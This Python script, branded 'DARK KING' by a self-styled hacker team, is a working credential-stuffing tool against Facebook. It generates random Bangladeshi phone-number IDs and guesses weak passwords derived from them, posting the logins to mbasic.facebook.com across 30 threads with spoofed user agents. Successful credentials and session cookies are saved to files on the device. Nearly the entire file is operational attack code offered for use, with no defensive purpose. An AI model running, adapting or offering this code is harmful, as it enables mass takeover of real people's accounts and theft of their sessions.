import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
li="\033[38;5;46m—"

cox=str(f"{li}"*37)        
logo = ("""\033[1;31m
      ⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ⠀⠀⢀⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⠀⠀⣠⣴⣦⡄⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀   ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣶⣶⣿⣿⣿⣿⡀⣽⡿⣶⣦⡀⠀⠀⠀⠀⠀
   ⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡿⣿⣿⣿⣿⣆⠀⠀⠀⠀
   ⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣦⠀⠀⠀
   ⠀⠀⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣿⣿⣿⣿⣿⡿⢟⣿⣷⡀⠀
   ⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣭⣿⣿⣽⣿⣽⣾⣿⣿⣿⠛⠉⠉⠀⢈⣿⣿⡇⠀
   ⠀⠀⠀⢻⣿⣿⠛⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠡⠤⠄⠁⠀⠀⢻⣿⡇⠀
   ⠀⠀⠀⠘⣿⣿⠄⠀⠀⠀⠀⠀⣉⠙⠋⢿⣿⣯⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⡃⠀
   ⠀⠀⠀⠀⢹⣿⣇⣀⠀⠈⠉⠉⠁⠀⣤⢠⣿⣿⣧⡆⣤⣤⡀⣾⣿⣿⣿⢠⡇⠀
   ⠀⠀⠀⠀⠀⣿⣿⣿⣷⣤⠄⣀⣴⣧⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⠇⠀
   ⠀⠀⠀⠀⠀⠸⣿⣯⠉⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡯⠁⡌⠀⠀
⠀   ⠀⠀⠀⠀⠀⠙⢿⡄⢿⣿⣿⣿⣿⣿⣎⠙⠻⠛⣁⣼⣿⣿⡿⠛⠁⡸⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠉⣿⡿⣿⣿⣿⣿⣷⣬⣿⡿⠟⠋⢀⣴⡞⠁⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⠀⠀⠀⠀⠉⠉⠋⠉⠉⠁⠀⢀⣴⣿⡿⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠿⢃⣴⣿⣿⣿⠃⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠉
   
     \033[1;31m██████╗  \033[1;30m█████╗ \033[34;1m██████╗ \033[1;32m██╗  ██╗
     \033[1;31m██╔══██╗\033[1;30m██╔══██╗\033[34;1m██╔══██╗\033[1;32m██║ ██╔╝
     \033[1;31m██║  ██║\033[1;30m███████║\033[34;1m██████╔╝\033[1;32m█████╔╝ 
     \033[1;31m██║  ██║\033[1;30m██╔══██║\033[34;1m██╔══██╗\033[1;32m██╔═██╗
     \033[1;31m██████╔╝\033[1;30m██║  ██║\033[34;1m██║  ██║\033[1;32m██║  ██╗
     \033[1;31m╚═════╝ \033[1;30m╚═╝  ╚═╝\033[34;1m╚═╝  ╚═╝\033[1;32m╚═╝  ╚═╝
                                
     \033[1;35m██╗  ██╗\033[1;37m██╗\033[0;93m███╗   ██╗ \033[1;36m██████╗   
     \033[1;35m██║ ██╔╝\033[1;37m██║\033[0;93m████╗  ██║\033[1;36m██╔════╝   
     \033[1;35m█████╔╝ \033[1;37m██║\033[0;93m██╔██╗ ██║\033[1;36m██║  ███╗  
     \033[1;35m██╔═██╗ \033[1;37m██║\033[0;93m██║╚██╗██║\033[1;36m██║   ██║  
     \033[1;35m██║  ██╗\033[1;37m██║\033[0;93m██║ ╚████║\033[1;36m╚██████╔╝  
     \033[1;35m╚═╝  ╚═╝\033[1;37m╚═╝\033[0;93m╚═╝  ╚═══╝ \033[1;36m╚═════╝""")
logo1 = ("""
  \033[38;5;46m══════════════════════════════════════════════════
\033[0;93m᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱  
    \033[0;93m🔰🎭 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇 𝐃𝐀𝐑𝐊 𝐖𝐄𝐕 𝐇𝐀𝐂𝐊𝐄𝐑 𝐓𝐄𝐈𝐌🎭🔰
\033[0;93m'᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱                                                  
\033[38;5;46m══════════════════════════════════════════════════                            
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 :   
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐅𝐀𝐂𝐄𝐁𝐎𝐊 : 
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐆𝐈𝐓𝐇𝐔𝐁 : 𝐃𝐀𝐑𝐊𝐊𝐈𝐍𝐆𝐂𝐘𝐁𝐄𝐑𝟕𝟏
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐓𝐎𝐎𝐋 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝐅𝐑𝐄𝐄
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐏𝐀𝐆𝐄 : 𝐃𝐀𝐑𝐊𝐖𝐄𝐁𝐂𝐘𝐁𝐄𝐑𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘𝟒𝟎𝟒
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐓𝐎𝐎𝐋 𝐕𝐈𝐑𝐒𝐈𝐎𝐍 : 𝟏.𝟎              \033[1;93m
\033[38;5;46m══════════════════════════════════════════════════
 \033[0;93m᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ 
     \033[0;93m🎭🎭 𝐃𝐀𝐑𝐊 𝐖𝐄𝐁 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘  🎭🎭 
 \033[0;93m᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱                           
\033[38;5;46m══════════════════════════════════════════════════""")

def Emranx():
	print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆')

def Main():
        os.system("clear")
        print(logo)
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆')
        print(" \033[38;5;46m 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆 𝐖𝐎𝐑𝐊 𝐑𝐀𝐍𝐃𝐎𝐌 𝐁𝐃")
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆')
        print(" \033[38;5;46m 𝐅𝐔𝐂𝐊𝐎 𝟐}")
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆')      
        Emran =input("\n \033[38;5;46m𝐅𝐀𝐂𝐊 𝐘𝐎𝐔 𝐆𝐅: ")
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆')
        if Emran in ["𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒"]:
            fuck()
        if Emran in ["𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒", "00"]:
            exit()
        else:
            exit()
#===========𝙁𝙐𝘾𝙆 𝙔𝙊𝙐          
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
    print('\033[38;5;46m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆]𝐒𝐈𝐌𝐄 𝐂𝐎𝐃𝐄 \x1b[38;5;196m𝟬𝟭𝟳 \033[34;1m 𝟎𝟏𝟕 \033[33;1m 𝟎𝟏𝟖 \x1b[38;5;196m 𝟎𝟏𝟔')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
    code = input('\033[38;5;46m{𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒}𝐂𝐇𝐎𝐊𝐄𝐒 : ')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
    print('\033[38;5;46m𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒]𝐋𝐌𝐓 \033[34;1m𝟐𝟎𝟎〱\033[34;1m𝟑𝟎𝟎 \033[33;1m𝟓𝟎𝟎𝟎 \x1b[38;5;196m𝟏𝟎𝟎𝟎𝟎')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
    limit = int(input('\033[38;5;46m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] 𝐂𝐇𝐎𝐊𝐄𝐒 : '))
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
        print('╔══➻💎\033[38;5;46m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆\x1b[38;5;196m 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊\033[34;1m𝐈𝐃 '+tl)
        print("╚══➻💎\033[38;5;46m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆\033[37;1m 𝐒𝐈𝐌𝐄\x1b[38;5;196m𝐂𝐎𝐃𝐄 "+code)
        print('╔══➻💎\033[38;5;46m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆\033[38;5;46m 𝐖𝐎𝐑𝐊\x1b[38;5;196m𝐖𝐈𝐅𝐈\033[34;1m𝐃𝐀𝐓𝐀')
        print('╚══➻💎\033[38;5;46m𝟒𝟎𝟒\x1b[38;5;196m 𝐏𝐀𝐈𝐃\033[34;1m𝐂𝐎𝐌𝐌𝐀𝐍𝐃')
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(emran2,uid,pwx,tl)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
    print('\033[38;5;46m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] Crack process has been completed')
    print('\033[38;5;46m𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒] OK Ids saved in EMRAN/OK.txt')
    print('\033[38;5;46m𝐃??𝐑𝐊 𝐊𝐈𝐍𝐆] CP Ids s═════aved in EMRAN/CP.txt')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝟒𝟎𝟒')
def emran2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()           
            sys.stdout.write('\r\033[38;5;46m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆%s/%s𝐂𝐏-𝐈𝐃➲%s➲😓𝐎𝐊-𝐈𝐃➲💎%s\r'%(loop,tl,len(cps),len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
#_________𝗨𝗣𝗗𝗔𝗧𝗘 𝗦𝗬𝗦𝗧𝗘𝗠➻➲🥰🥰        
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5762.222", "Google Chrome";v="114.0.5762.222"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5762.222 Mobile Safari/537.36',
            'viewport-width': '980',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text           
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
#_________𝗢𝗞_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗢𝗞✅-𝗜𝗗-------➲🥰🥰       
                print(f"""
\033[33;1m𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊╔══➻💎\033[38;5;46m𝐍𝐔𝐌𝐁𝐄𝐑 ╔══➻💎\033[38;5;46m{uid} 
\033[33;1m𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊╚══➻💎\033[38;5;46m𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃╚══➻💎\033[38;5;46m{ps}
\033[33;1m𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝐂𝐇𝐎𝐊𝐄𝐒(𝐎𝐊✅)\033[38;5;46m{coki}
""")
                open('/sdcard/DARKGKING/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
 #_________𝗖𝗣_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗟𝗢𝗖𝗞-𝗜𝗗------➲😓😓
                print(f"""
\033[33;1m𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊╔══➻💎\033[38;5;46m𝐍𝐔𝐌𝐁𝐄𝐑╔══➻💎\033[38;5;46m{uid} 
\033[33;1m𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊╚══➻💎\033[38;5;46m𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃╚══➻💎\033[38;5;46m{ps}
""")
                open('/sdcard/DARK-KING-𝐎𝐊-𝐈𝐃✅-𝐈𝐃✅-𝐈𝐃.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
